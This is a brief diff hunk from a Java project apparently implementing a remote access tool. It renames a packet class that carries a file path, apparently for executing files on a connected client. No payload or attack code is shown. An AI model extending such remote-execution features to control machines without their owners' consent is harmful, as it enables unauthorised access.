@@ -7,15 +7,15 @@ import java.io.IOException;
 
 import de.sogomn.rat.ActiveClient;
 
-public final class ExecutePacket implements IPacket {
+public final class ExecuteFilePacket implements IPacket {
 	
 	private String path;
 	
-	public ExecutePacket(final String path) {
+	public ExecuteFilePacket(final String path) {
 		this.path = path;
 	}
 	
-	public ExecutePacket() {
+	public ExecuteFilePacket() {
 		this("");
 	}
 	
